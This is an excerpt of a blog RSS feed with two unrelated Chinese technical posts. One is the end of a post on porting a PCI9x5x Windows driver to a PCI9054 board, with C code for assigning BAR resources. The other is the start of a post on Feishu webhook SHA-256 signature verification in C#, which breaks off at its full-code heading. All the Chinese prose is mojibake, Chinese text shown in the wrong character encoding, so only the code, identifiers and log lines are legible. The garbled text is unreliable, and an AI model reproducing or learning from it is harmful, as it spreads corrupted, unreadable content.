<p>ä½æ¯1.11ä¸ä¸æ¯æWdfDmaTransactionSetSingleTransferRequirementå½æ°ï¼æ³¨éæåæè½æ­£å¸¸ç¼è¯ï¼è¿ä¸ªå½æ°ç¨äºç¡®å®DMAæ¯å¦éè¦åæ¬¡ä¼ è¾å®æææ°æ®ï¼å¨æ¬é©±å¨ä¸­ï¼å¯ä»¥éè¿åæ­¥IOæ¥è§£å³è¿ä¸ªé®é¢ï¼åé¢åè¯´</p>
<h2 id="å¨ç®æ æºå¨ä¸æ­å»ºè°è¯ç¯å¢">å¨ç®æ æºå¨ä¸æ­å»ºè°è¯ç¯å¢</h2>
<p>é¦åå¨windows11ä¸éç½®ï¼åç»­åä½¿ç¨windows7ã</p>
<h3 id="æ¯æå®éªç­¾å">æ¯æå®éªç­¾å</h3>
<p>64ä½ç³»ç»å¿é¡»å¾ææ°å­ç­¾åæè½å¤å®è£é©±å¨ï¼VS2017+WDKçç¼è¯ç¯å¢å¯ä»¥èªå¨å æµè¯ç­¾åï¼æä»¥åªè¦å°ç®æ æºå¼å¯TestSigningå³å¯ï¼è¿é¨åå¯ä»¥èªè¡ç¾åº¦ï¼æèç´æ¥ä½¿ç¨ç­¾åå·¥å·âWindows 64Signer V1.2.exeâï¼å®é¤äºç»é©±å¨ç­¾åï¼è¿è½å¼å¯TestSigningã</p>
<h3 id="æ¯æåæ ¸ä¿¡æ¯è¾åº">æ¯æåæ ¸ä¿¡æ¯è¾åº</h3>
<p>debugviewæ¯å¯ä»¥æ¾ç¤ºåæ ¸ä¿¡æ¯çï¼ä½æ¯ç¤ºä¾é©±å¨ä¸­ä½¿ç¨WPPï¼Windows Software Trace Preprocessorï¼æ¹å¼è·è¸ªä»£ç æµç¨ï¼éè¦è¿è¡ä¸å®çè½¬æ¢æè½æ¾ç¤ºå¨debugviewä¸­ï¼æä»¥ææ¶åä¸ä½¿ç¨debugviewæ¾ç¤ºã</p>
<p>å¨Windows11ä¸æ¯è¾ç®åå°±å¯ä»¥ä½¿ç¨å·¥å·æ¾ç¤ºWPPçè¾åºä¿¡æ¯ï¼ç´æ¥å°WDKå®è£ç®å½çå¯æ§è¡æä»¶å¤¹å¤å¶å°ç®æ æºå¨å³å¯ï¼æçç®å½æ¯ï¼<br>
C:\Program Files (x86)\Windows Kits\10\Tools\x64<br>
å°x64ç®å½æ´ä¸ªå¤å¶å°ç®æ æºï¼ç¶åä»¥ç®¡çåèº«ä»½è¿è¡è¿è¡traceview.exe<br>
åæ¬¡è¿è¡éè¦File-"Create New Log Session"-"PDBï¼Debug Informationï¼ File"<br>
éæ©ç¼è¯ç®å½çPci9x5x.pdb</p>
<p>ç¶åå°±è½çå°å¨é©±å¨ä¸­è¾åºçä¿¡æ¯äºã</p>
<h2 id="å¯å­å¨å®ä¹">å¯å­å¨å®ä¹</h2>
<p>PCI9656ä¸PCI9054å¨åºå°åãä¸­æ­ä»¥åDMAæä½æ¹é¢çå®ä¹å®å¨ä¸æ ·ï¼åªæå¶å®ä¸äºæ²¡ç¨å°çåè½å®ä¹ä¸åï¼æä»¥ç¨å æ¹å¨å°±å¯ä»¥ä½¿ç¨ç¤ºä¾ç¨åºä¸­çå¯å­å¨å¤´æä»¶ã</p>
<h2 id="åéèµæº">åéèµæº</h2>
<p>PLxPrepareHardwareå½æ°ä¸­åéèµæº<br>
å¯¹äºPCIæ»çº¿ï¼é©±å¨ä½¿ç¨BARè¿ä¸ªæ¦å¿µæ¥åéå¯å­å¨èµæºï¼BARæ¯"Base Address Register"çç¼©åï¼ä¹å°±æ¯åºå°åå¯å­å¨ï¼32ä½PCIæ»çº¿æå¤6ä¸ªBARï¼æ ¹æ®æ¾å°é¡ºåºçä¸åï¼ä»BAR0~BAR5ã</p>
<h3 id="èé©±å¨ä¸­9054åéèµæºæä½">èé©±å¨ä¸­9054åéèµæºæä½ï¼</h3>
<p>æç§èµæºåºå·ï¼</p>
<ul>
<li>BAR3å¯¹åºæ¬å°è¯ç å°åï¼è¯»åæä½FPGA
<ul>
<li>åºç¨å±è¯»åIOä½¿ç¨</li>
</ul>
</li>
<li>BAR2å¯¹åºæ¬å°è¯ç å°åï¼è¯»åæä½FPGA
<ul>
<li>åæ ¸æä½ä½¿ç¨</li>
</ul>
</li>
<li>BAR1å¯¹åºPCI9054å°åï¼è¯»åæä½9054</li>
</ul>
<p>ä¸ç¥éä¸ºä½èé©±å¨ä½¿ç¨äºä¸¤ä¸ªBARæ¥æä½ç¸åçæ¬å°æ»çº¿ï¼æ°é©±å¨åºè¯¥ä½¿ç¨ä¸ä¸ªå³å¯ã</p>
<h3 id="æ°é©±å¨ä¸­èµæºåéæä½">æ°é©±å¨ä¸­èµæºåéæä½ï¼</h3>
<p>ä¸é¢æ¯PCI9656å¼åæ¿çèµæºåéï¼</p>
<ul>
<li>æ¾å°åå­æ¹å¼ä¸é¿åº¦å¯¹åº0x200ï¼åå¯¹åºBAR0ï¼å°åæ å°ç»Regsï¼ç´æ¥ä½¿ç¨ç»æä½åæåæ¥æä½å¯å­å¨ã</li>
<li>æ¾å°IOæ¹å¼ä¸é¿åº¦å¤§äºæèç­äº0x100ï¼åå¯¹åºBAR1ï¼åç»­å¹¶æ²¡æå¤çè¿ä¸ªèµæºã</li>
<li>ç¬¬ä¸æ¬¡æ¾å°åå­æ¹å¼ä¸é¿åº¦å¯¹åº0x20000ï¼åå¯¹åºBAR2ï¼åé¢æ å°å°åç»SRAMBaseï¼ä½æ¯ä¹æ²¡æç¨å°è¿ä¸ªå°åã</li>
<li>ç¬¬äºæ¬¡æ¾å°åå­æ¹å¼ä¸é¿åº¦å¯¹åº0x20000ï¼åå¯¹åºBAR3ï¼å®éä¸åé¢æ²¡æå¤çè¿ä¸ªèµæº</li>
</ul>
<p>å¯¹äºèäº§åï¼æ»çèµæºæ°éæ9ä¸ªï¼åéæåµå¦ä¸</p>
<ul>
<li>0 åå­èµæºï¼é¿åº¦=256ï¼BAR0ï¼</li>
<li>1 129å·èµæºï¼è®¾å¤ç§æèµæºï¼åºè¯¥ç¨ä¸å°</li>
<li>2 IOèµæºï¼é¿åº¦256ï¼PCI9054å°åï¼BAR1ï¼</li>
<li>3 129å·èµæºï¼è®¾å¤ç§æèµæºï¼åºè¯¥ç¨ä¸å°</li>
<li>4 åå­èµæºï¼é¿åº¦131,072ï¼0x20000ï¼ï¼è¿ä¸ªåºè¯¥æ¯ææ©9054å¼åæ¿çèµæºåéä¿¡æ¯ï¼èäº§åä¿çäºè¿ä¸ªè®¾ç½®ï¼å®éåºè¯¥å¯¹åºæ¬å°å°åï¼æä½FPGAãï¼BAR2ï¼</li>
<li>5 129å·èµæºï¼è®¾å¤ç§æèµæºï¼åºè¯¥ç¨ä¸å°</li>
<li>6 IOèµæºï¼é¿åº¦256ï¼æ¬å°å°åï¼æä½FPGAï¼BAR3ï¼</li>
<li>7 129å·èµæºï¼è®¾å¤ç§æèµæºï¼åºè¯¥ç¨ä¸å°</li>
<li>8 ä¸­æ­èµæºï¼è¿ä¸ªä»¥ååå¤çã<br>
ä¹åæ æ³ç¡®å®åªä¸ªèµæºå¯¹åºæ¬å°IOï¼å æ­¤éè¦æµè¯52å°åæ¯å¦è½è¿å0x3100æ¥å¤æ­ï¼å¦æè¿å0x3100åè¯´ææ¯æ¬å°IO<br>
ç»è¿æµè¯åï¼6å·èµæºï¼BAR2ï¼å¯¹åºæ¬å°å¯å­å¨ï¼2å·èµæºï¼BAR1ï¼å¯¹åºPCI9054å¯å­å¨ãä»ä»¬é½æ¯IOèµæºï¼å¯ä»¥ç´æ¥ä½¿ç¨READ_PORT_ULONGåWRITE_PORT_ULONGè¿è¡è¯»åæä½ãåå­èµæºéè¦ä½¿ç¨âLocalMmMapIoSpaceâå½æ°è½¬æ¢åï¼æè½ä½¿ç¨WRITE_REGISTER_ULONGåREAD_REGISTER_ULONGæä½ãä¸ªäººæè§IOèµæºæä½æ´æ¹ä¾¿ï¼æä»¥ææå¯å­å¨æä½åä½¿ç¨IOèµæºã</li>
</ul>
<p>ä»¿ç§ç¤ºä¾é©±å¨ï¼åæ¾å°çIOèµæºæ¯PCI9054å°åï¼åæ¾å°çIOèµæºæ¯æ¬å°èµæºãä¿®æ¹åçä»£ç å¦ä¸ï¼</p>
<pre><code class="language-c">case CmResourceTypePort:
//åéIOèµæº
  bar = NULL;

  if (!foundLocalPort &amp;&amp; !found9054Port &amp;&amp;
      desc-&gt;u.Port.Length == 0x100) {
        found9054Port = TRUE;
        bar = "BAR1-9054";
        DevExt-&gt;Regs = (PPCI9656_REGS)UlongToPtr(desc-&gt;u.Port.Start.QuadPart);
        DevExt-&gt;RegsLength = regsLength;
      }
      else if (!foundLocalPort &amp;&amp; 
                desc-&gt;u.Port.Length == 0x100) {
        foundLocalPort = TRUE;
        bar = "BAR3-FPGA";
        DevExt-&gt;addrLocal = (PUCHAR)UlongToPtr(desc-&gt;u.Port.Start.QuadPart);
        DevExt-&gt;localLength = desc-&gt;u.Port.Length;
      }

      TraceEvents(TRACE_LEVEL_INFORMATION, DBG_PNP,
                  " - Port   Resource [%08I64X-%08I64X], %s, i:%d length:%d",
                    desc-&gt;u.Port.Start.QuadPart,
                    desc-&gt;u.Port.Start.QuadPart +
                    desc-&gt;u.Port.Length,
                    (bar) ? bar : "&lt;unrecognized&gt;",
                    i,
                    desc-&gt;u.Port.Length);
break;
</code></pre>
<p>è³æ­¤ï¼èµæºåéé¨åä»£ç å®æï¼åç»­è¦ä¿®æ¹å¶å®å·ä½æä½ã</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-16 17:06">2026-01-16 17:06</span>&nbsp;
<a href="https://www.cnblogs.com/haohaoganhuo">èªç±çå¥½å¥½å¹²æ´»</a>&nbsp;
éè¯»(<span id="post_view_count">54</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19493093);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19493093', targetLink: 'https://www.cnblogs.com/haohaoganhuo/p/19493093', title: 'PCI9x5xé©±å¨ç§»æ¤æ¯æPCI9054å¨win7ä¸ä½¿ç¨1' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ æ·±å¥çè§£é£ä¹¦ Webhook ç­¾åéªè¯ï¼ä¸æ¬¡è¸©åå°å¡«åçå®æ´è®°å½ ]]></title>
    <link>https://www.cnblogs.com/mudtools/p/19492945</link>
    <guid>fa2619b5f70bbf050fdb7af875414dd9</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/mudtools/p/19492945" title="åå¸äº 2026-01-16 16:45">
    <span role="heading" aria-level="2">æ·±å¥çè§£é£ä¹¦ Webhook ç­¾åéªè¯ï¼ä¸æ¬¡è¸©åå°å¡«åçå®æ´è®°å½</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>ä½ä¸ºä¸åå¤å³ççé©¬ï¼æå¨å¯¹æ¥é£ä¹¦å¼æ¾å¹³å°æ¶éå°äºä¸ä¸ªçä¼¼ç®åå´è®©äººæççé®é¢ââç­¾åéªè¯æ»æ¯å¤±è´¥ãç»è¿ä¸çªæ·±å¥ç ç©¶ï¼æåç°è¿ä¸ªé®é¢èåéèçè®¸å¤å®¹æè¢«å¿½è§çç»èãä»å¤©ï¼ææ³ç¨æéä¿çè¯­è¨ï¼æè¿æ®µç»åè®°å½ä¸æ¥ã</p>
</blockquote>
<h2 id="æäºçå¼å§ä¸ä¸ªç¥ç§çç­¾åéªè¯å¤±è´¥">æäºçå¼å§ï¼ä¸ä¸ªç¥ç§çç­¾åéªè¯å¤±è´¥</h2>
<h3 id="é®é¢ç°åº">é®é¢ç°åº</h3>
<p>é£æ¯ä¸ä¸ªæ®éçå·¥ä½æ¥ä¸åï¼ææ­£å¨ä¸ºå¬å¸çåé¨ç³»ç»å¯¹æ¥é£ä¹¦çäºä»¶è®¢éåè½ãä¸åçèµ·æ¥é½å¾é¡ºå©ï¼</p>
<ul>
<li>â åºç¨åå»ºå®æ</li>
<li>â äºä»¶è®¢ééç½®å®æ</li>
<li>â Webhook å°åå¡«åæ­£ç¡®</li>
<li>â ä»£ç é¨ç½²ä¸çº¿</li>
</ul>
<p>ä½æ¯ï¼å½ææ»¡ææå¾å°å¨é£ä¹¦åå°ç¹å»"éªè¯"æé®æ¶ï¼ç³»ç»æ¥å¿éåºç°äºè¿æ ·ä¸è¡çº¢è²çéè¯¯ï¼</p>
<pre><code class="language-log">warn: Mud.Feishu.Webhook.FeishuEventValidator[0]       
è¯·æ±å¤´ç­¾åéªè¯å¤±è´¥: è®¡ç® +OGVt6ye......, ææ bc5b503a......
</code></pre>
<p><strong>ä»ä¹ï¼ç­¾åéªè¯å¤±è´¥ï¼</strong></p>
<p>ææ£æ¥äºéç½®æä»¶ï¼å¯é¥é½å¡«å¯¹äºï¼ææ£æ¥äºä»£ç é»è¾ï¼çèµ·æ¥ä¹æ²¡é®é¢ãä½å°±æ¯éªè¯ä¸éè¿ï¼</p>
<h3 id="åæ­¥åæ">åæ­¥åæ</h3>
<p>è®©æä»¬åççæ¥å¿éçå¶ä»ä¿¡æ¯ï¼</p>
<pre><code class="language-log">dbug: Mud.Feishu.Webhook.FeishuEventDecryptor[0]
è§£å¯æåï¼ç»æé¿åº¦: 489

dbug: Mud.Feishu.Webhook.FeishuEventDecryptor[0]
è§£å¯åçJSONæ°æ®: {"schema":"2.0","header":{"event_id":"...","token":"fCt8xobp..."}}

info: Mud.Feishu.Webhook.FeishuEventDecryptor[0]
äºä»¶æ°æ®è§£å¯æå - EventType: [contact.department.created_v3]
</code></pre>
<p>æææçæ¯ï¼</p>
<ul>
<li>â æ°æ®è§£å¯æåäº</li>
<li>â äºä»¶ç±»åè¯å«æ­£ç¡®</li>
<li>â ä½ç­¾åéªè¯å¤±è´¥äº</li>
</ul>
<p>è¿è¯´æä»ä¹ï¼è¯´ææç <strong>Encrypt Keyï¼å å¯å¯é¥ï¼æ¯å¯¹ç</strong>ï¼ä½ç­¾åéªè¯çé»è¾è¯å®åªéåºäºé®é¢ã</p>
<hr>
<h2 id="é£ä¹¦-webhook-çå®å¨æºå¶">é£ä¹¦ Webhook çå®å¨æºå¶</h2>
<p>å¨æ·±å¥é®é¢ä¹åï¼è®©æä»¬åçè§£é£ä¹¦æ¯å¦ä½ä¿æ¤ Webhook å®å¨çã</p>
<h3 id="ä¸¤æé¥åçæäº">ä¸¤æé¥åçæäº</h3>
<p>é£ä¹¦ç»æ¯ä¸ªåºç¨éç½®äºä¸¤æ"é¥å"ï¼</p>
<div class="mermaid">graph TB
    subgraph "é£ä¹¦åºç¨çä¸¤æé¥å"
        A["ð Verification Token&lt;br/&gt;(éªè¯ä»¤ç)"]
        B["ð Encrypt Key&lt;br/&gt;(å å¯å¯é¥)"]
        
        A --&gt; A1["ç¨éï¼URL éªè¯è¯·æ±"]
        A --&gt; A2["æ ¼å¼ï¼éæºå­ç¬¦ä¸²"]
        A --&gt; A3["ç¤ºä¾ï¼fCt8xobpOKdb4yA0UoKJrhNTUaXTzJnf"]
        
        B --&gt; B1["ç¨éï¼æ°æ®å å¯/è§£å¯ãç­¾åéªè¯"]
        B --&gt; B2["æ ¼å¼ï¼32 ä½å­ç¬¦ä¸²"]
        B --&gt; B3["ç¤ºä¾ï¼go4kwHmzAbCdEfGhIjKlMnOpQrStUvWx"]
    end
    
    style A fill:#e1f5ff
    style B fill:#fff3e0
</div><p><strong>ç®åæ¥è¯´ï¼</strong></p>
<ul>
<li><strong>Verification Token</strong> å°±åä½ å®¶çé¨çå·ï¼ç¨æ¥ç¡®è®¤"è¿æ¯ä½ å®¶"</li>
<li><strong>Encrypt Key</strong> å°±åä½ å®¶çé¥åï¼ç¨æ¥"å¼é¨"å"éªè¯èº«ä»½"</li>
</ul>
<h3 id="é£ä¹¦åéè¯·æ±çå®æ´æµç¨">é£ä¹¦åéè¯·æ±çå®æ´æµç¨</h3>
<p>å½é£ä¹¦è¦ç»ä½ çæå¡å¨åéäºä»¶éç¥æ¶ï¼å®ä¼ç»åè¿æ ·ä¸ä¸ªè¿ç¨ï¼</p>
<div class="mermaid">sequenceDiagram
    participant FS as é£ä¹¦æå¡å¨
    participant YS as ä½ çæå¡å¨
    
    Note over FS: æ­¥éª¤ 1ï¼åå¤äºä»¶æ°æ®
    FS-&gt;&gt;FS: {"event_type": "...", "data": {...}}
    
    Note over FS: æ­¥éª¤ 2ï¼ä½¿ç¨ Encrypt Key å å¯æ°æ®
    FS-&gt;&gt;FS: "Ul/tHTDEQkOlKZuqYTS7t+zTb8z/..."
    
    Note over FS: æ­¥éª¤ 3ï¼çæç­¾å
    FS-&gt;&gt;FS: timestamp + nonce + key + body
    FS-&gt;&gt;FS: â SHA-256
    FS-&gt;&gt;FS: f2d909fb8a7c3e1d...
    
    Note over FS: æ­¥éª¤ 4ï¼åé HTTP è¯·æ±
    FS-&gt;&gt;YS: POST /webhook&lt;br/&gt;Headers:&lt;br/&gt;X-Lark-Request-Timestamp: 1768...&lt;br/&gt;X-Lark-Request-Nonce: 149323894&lt;br/&gt;X-Lark-Signature: f2d909fb...&lt;br/&gt;Body: {"encrypt": "Ul/tHTDEQkO..."}
    
    Note over YS: æ¥æ¶å¹¶å¤çè¯·æ±
</div><h3 id="ä½ çæå¡å¨éè¦åä»ä¹">ä½ çæå¡å¨éè¦åä»ä¹</h3>
<p>æ¶å°é£ä¹¦çè¯·æ±åï¼ä½ éè¦æç§ç¸åçé¡ºåºéªè¯åå¤çï¼</p>
<div class="mermaid">flowchart TD
    Start([æ¶å°é£ä¹¦è¯·æ±]) --&gt; Step1[æ­¥éª¤ 1ï¼éªè¯ç­¾å â ï¸]
    Step1 --&gt; |éªè¯éè¿| Step2[æ­¥éª¤ 2ï¼è§£å¯æ°æ®]
    Step1 --&gt; |éªè¯å¤±è´¥| Reject[â æç»è¯·æ±]
    
    Step2 --&gt; |è§£å¯æå| Step3[æ­¥éª¤ 3ï¼å¤çäºä»¶]
    Step2 --&gt; |è§£å¯å¤±è´¥| Reject
    
    Step3 --&gt; Step4[æ­¥éª¤ 4ï¼è¿åååº]
    Step4 --&gt; Success[â è¿åæå]
    
    style Step1 fill:#ffebee
    style Step2 fill:#e3f2fd
    style Step3 fill:#e8f5e9
    style Step4 fill:#fff3e0
    style Success fill:#c8e6c9
    style Reject fill:#ffcdd2
</div><hr>
<h2 id="æè¸©è¿çåä¸ªå¤§å">æè¸©è¿çåä¸ªå¤§å</h2>
<p>ç°å¨ï¼è®©æä»¬æ¥ççæå¨å®ç°ç­¾åéªè¯æ¶è¸©è¿çåãå¦æä½ ä¹éå°äºç­¾åéªè¯å¤±è´¥çé®é¢ï¼å¾å¯è½å°±æ¯å ä¸ºè¿äºåå ã</p>
<h3 id="å-1ç¨éäºç­¾åç®æ³">å #1ï¼ç¨éäºç­¾åç®æ³</h3>
<h4 id="-ææåçéè¯¯å®ç°">â ææåçéè¯¯å®ç°</h4>
<pre><code class="language-csharp">// æä»¥ä¸ºé£ä¹¦ç¨çæ¯ HMAC-SHA256ï¼å ä¸ºå¾å¤å¹³å°é½ç¨è¿ä¸ªï¼
var signString = $"{timestamp}\n{nonce}\n{body}";
using var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(encryptKey));
var hashBytes = hmac.ComputeHash(Encoding.UTF8.GetBytes(signString));
var signature = Convert.ToBase64String(hashBytes);
</code></pre>
<p><strong>ä¸ºä»ä¹éäºï¼</strong></p>
<p>æåèäºå¾®ä¿¡ãééç­å¹³å°çå®ç°ï¼å®ä»¬å¤§å¤ä½¿ç¨ HMAC-SHA256 ç®æ³ãä½é£ä¹¦ä¸ä¸æ ·ï¼</p>
<h4 id="-æ­£ç¡®çå®ç°">â æ­£ç¡®çå®ç°</h4>
<pre><code class="language-csharp">// é£ä¹¦ä½¿ç¨çæ¯çº¯ SHA-256 åå¸ï¼ä¸æ¯ HMACï¼
var signString = $"{timestamp}{nonce}{encryptKey}{body}";
using var sha256 = SHA256.Create();
var hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(signString));
var signature = BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
</code></pre>
<p><strong>å¯¹æ¯è¡¨æ ¼ï¼</strong></p>
<table>
<thead>
<tr>
<th>ç¹æ§</th>
<th>HMAC-SHA256</th>
<th>SHA-256</th>
</tr>
</thead>
<tbody>
<tr>
<td>æ¯å¦éè¦å¯é¥</td>
<td>â éè¦ï¼ä½ä¸º HMAC çå¯é¥ï¼</td>
<td>â ä¸éè¦ï¼å¯é¥ç´æ¥æ¼æ¥å°å­ç¬¦ä¸²ä¸­ï¼</td>
</tr>
<tr>
<td>ç®æ³ç±»å</td>
<td>æ¶æ¯è®¤è¯ç </td>
<td>åå¸å½æ°</td>
</tr>
<tr>
<td>é£ä¹¦ä½¿ç¨</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td>å¾®ä¿¡ä½¿ç¨</td>
<td>â</td>
<td>â</td>
</tr>
</tbody>
</table>
<h3 id="å-2ç­¾åå­ç¬¦ä¸²æ ¼å¼éè¯¯">å #2ï¼ç­¾åå­ç¬¦ä¸²æ ¼å¼éè¯¯</h3>
<h4 id="-ææåçéè¯¯å®ç°-1">â ææåçéè¯¯å®ç°</h4>
<pre><code class="language-csharp">// æä»¥ä¸ºåé¨åè¦ç¨æ¢è¡ç¬¦åéï¼å ä¸ºçèµ·æ¥æ´"è§è"ï¼
var signString = $"{timestamp}\n{nonce}\n{body}";
</code></pre>
<p><strong>ä¸ºä»ä¹éäºï¼</strong></p>
<p>ææ³å½ç¶å°è®¤ä¸ºï¼æ¢ç¶æ¯å¤ä¸ªé¨åç»æçå­ç¬¦ä¸²ï¼åºè¯¥ç¨æç§åéç¬¦ãæ¢è¡ç¬¦ <code>\n</code> çèµ·æ¥æ¯ä¸ªä¸éçéæ©ã</p>
<p>ä½å®éä¸ï¼é£ä¹¦çç­¾åå­ç¬¦ä¸²æ¯<strong>ç´æ¥æ¼æ¥</strong>çï¼èä¸è¿è¦åå« <strong>Encrypt Key</strong>ï¼</p>
<h4 id="-æ­£ç¡®çå®ç°-1">â æ­£ç¡®çå®ç°</h4>
<pre><code class="language-csharp">// ç´æ¥æ¼æ¥ï¼æ ä»»ä½åéç¬¦
var signString = $"{timestamp}{nonce}{encryptKey}{body}";
</code></pre>
<p><strong>ç¤ºä¾å¯¹æ¯ï¼</strong></p>
<pre><code>â éè¯¯æ ¼å¼ï¼ææ¢è¡ç¬¦ï¼ç¼ºå° encryptKeyï¼ï¼
1768550348
149323894
{"encrypt":"Ul/tHTDEQkO..."}

â æ­£ç¡®æ ¼å¼ï¼ç´æ¥æ¼æ¥ï¼åå« encryptKeyï¼ï¼
1768550348149323894go4kwHmzAbCdEfGhIjKlMnOpQrStUvWx{"encrypt":"Ul/tHTDEQkO..."}
</code></pre>
<h3 id="å-3ç¨éäºå¯é¥">å #3ï¼ç¨éäºå¯é¥</h3>
<h4 id="-ææ¾ç»çå°æ">â ææ¾ç»çå°æ</h4>
<pre><code class="language-csharp">// æçå°è§£å¯åçæ°æ®éæä¸ª token å­æ®µ
// {"header":{"token":"fCt8xobpOKdb4yA0UoKJrhNTUaXTzJnf"}}
// ææ³ï¼è¿ä¸ª token åºè¯¥å°±æ¯ç¨æ¥éªè¯ç­¾åçå§ï¼

var signString = $"{timestamp}{nonce}{verificationToken}{body}";
</code></pre>
<p><strong>ä¸ºä»ä¹éäºï¼</strong></p>
<p>è¿æ¯ä¸ä¸ªå¾å®¹æç¯çéè¯¯ãå ä¸ºï¼</p>
<ol>
<li>è§£å¯åçæ°æ®éç¡®å®æä¸ª <code>token</code> å­æ®µ</li>
<li>è¿ä¸ª token çå¼æ­£å¥½æ¯ Verification Token</li>
<li>åå­å«"éªè¯ä»¤ç"ï¼å¬èµ·æ¥å°±åºè¯¥ç¨æ¥éªè¯</li>
</ol>
<p>ä½å®éä¸ï¼<strong>ç­¾åéªè¯è¦ç¨ Encrypt Key</strong>ï¼</p>
<h4 id="-æ­£ç¡®ççè§£">â æ­£ç¡®ççè§£</h4>
<table>
<thead>
<tr>
<th>å¯é¥ç±»å</th>
<th>ç¨é</th>
<th>å¨ç­¾åéªè¯ä¸­</th>
</tr>
</thead>
<tbody>
<tr>
<td>Verification Token</td>
<td>URL éªè¯è¯·æ±</td>
<td>â ä¸ä½¿ç¨</td>
</tr>
<tr>
<td>Encrypt Key</td>
<td>æ°æ®å å¯/è§£å¯ + ç­¾åéªè¯</td>
<td>â ä½¿ç¨è¿ä¸ª</td>
</tr>
</tbody>
</table>
<p><strong>è®°å¿æå·§ï¼</strong></p>
<ul>
<li><strong>Verification Token</strong> = é¨çå·ï¼ç¡®è®¤å°åï¼</li>
<li><strong>Encrypt Key</strong> = é¥åï¼å¼é¨ + éªè¯èº«ä»½ï¼</li>
</ul>
<h3 id="å-4è¾åºæ ¼å¼ä¸å¯¹">å #4ï¼è¾åºæ ¼å¼ä¸å¯¹</h3>
<h4 id="-ææåçéè¯¯å®ç°-2">â ææåçéè¯¯å®ç°</h4>
<pre><code class="language-csharp">// æä¹ æ¯æ§å°æåå¸ç»æè½¬æ Base64
var hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(signString));
var signature = Convert.ToBase64String(hashBytes);
// ç»æï¼lL4qIgAs8Kx... (Base64 æ ¼å¼)
</code></pre>
<p><strong>ä¸ºä»ä¹éäºï¼</strong></p>
<p>Base64 æ¯å¾å¸¸è§çç¼ç æ¹å¼ï¼æå¨å¶ä»é¡¹ç®ä¸­ç»å¸¸è¿æ ·ç¨ãä½é£ä¹¦è¦çæ¯<strong>å°ååå­è¿å¶å­ç¬¦ä¸²</strong>ï¼</p>
<h4 id="-æ­£ç¡®çå®ç°-2">â æ­£ç¡®çå®ç°</h4>
<pre><code class="language-csharp">// è½¬æ¢ä¸ºå°ååå­è¿å¶å­ç¬¦ä¸²
var hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(signString));
var signature = BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
// ç»æï¼f2d909fb8a7c... (å°ååå­è¿å¶)
</code></pre>
<p><strong>æ ¼å¼å¯¹æ¯ï¼</strong></p>
<pre><code>åå§åå¸å¼ï¼å­èæ°ç»ï¼ï¼
[242, 217, 9, 251, 138, 124, 62, 29, ...]

â Base64 ç¼ç ï¼
8tkJ+4p8Ph0...

â å°ååå­è¿å¶ï¼
f2d909fb8a7c3e1d...
</code></pre>
<hr>
<h2 id="æ­£ç¡®çå®ç°æ¹å¼">æ­£ç¡®çå®ç°æ¹å¼</h2>
<p>ç»è¿ä¸çªæè¾ï¼æç»äºææ¸æ¥äºæ­£ç¡®çå®ç°æ¹å¼ãè®©æç¨ææ¸æ°çæ¹å¼å±ç¤ºç»ä½ ã</p>
<h3 id="å®æ´çéªè¯æµç¨">å®æ´çéªè¯æµç¨</h3>
<div class="mermaid">flowchart TD
    Start([é£ä¹¦ Webhook ç­¾åéªè¯æµç¨]) --&gt; Step1[ç¬¬ 1 æ­¥ï¼æåè¯·æ±å¤´ä¿¡æ¯]
    
    Step1 --&gt; Step1a[X-Lark-Request-Timestamp â timestamp]
    Step1 --&gt; Step1b[X-Lark-Request-Nonce â nonce]
    Step1 --&gt; Step1c[X-Lark-Signature â expectedSignature]
    
    Step1a --&gt; Step2[ç¬¬ 2 æ­¥ï¼è¯»åè¯·æ±ä½]
    Step1b --&gt; Step2
    Step1c --&gt; Step2
    
    Step2 --&gt; Step2a[åå§ JSON å­ç¬¦ä¸² â body]
    
    Step2a --&gt; Step3[ç¬¬ 3 æ­¥ï¼é²éæ¾æ»å»æ£æ¥]
    
    Step3 --&gt; Check1{nonce æ¯å¦å·²ä½¿ç¨?}
    Check1 --&gt; |æ¯| Reject1[â æç»è¯·æ±]
    Check1 --&gt; |å¦| Check2{timestamp æ¯å¦ææ?}
    Check2 --&gt; |å¦| Reject2[â æç»è¯·æ±]
    Check2 --&gt; |æ¯| Step4[ç¬¬ 4 æ­¥ï¼æå»ºç­¾åå­ç¬¦ä¸²]
    
    Step4 --&gt; Step4a["signString = timestamp + nonce + encryptKey + body"]
    
    Step4a --&gt; Step5[ç¬¬ 5 æ­¥ï¼è®¡ç® SHA-256 åå¸]
    Step5 --&gt; Step5a["SHA256(signString) â hashBytes"]
    
    Step5a --&gt; Step6[ç¬¬ 6 æ­¥ï¼è½¬æ¢ä¸ºå°ååå­è¿å¶]
    Step6 --&gt; Step6a["BitConverter.ToString(hashBytes)&lt;br/&gt;.Replace('-', '').ToLower()"]
    
    Step6a --&gt; Step7[ç¬¬ 7 æ­¥ï¼åºå®æ¶é´æ¯è¾]
    Step7 --&gt; Compare{ç­¾åæ¯å¦ç¸ç­?}
    Compare --&gt; |æ¯| Success[â éªè¯éè¿]
    Compare --&gt; |å¦| Fail[â éªè¯å¤±è´¥]
    
    style Step1 fill:#e3f2fd
    style Step3 fill:#fff3e0
    style Step4 fill:#f3e5f5
    style Step5 fill:#e8f5e9
    style Step6 fill:#fce4ec
    style Step7 fill:#e0f2f1
    style Success fill:#c8e6c9
    style Fail fill:#ffcdd2
    style Reject1 fill:#ffcdd2
    style Reject2 fill:#ffcdd2
</div><h3 id="c-å®æ´ä»£ç å®ç°">C# å®æ´ä»£ç å®ç°</h3>
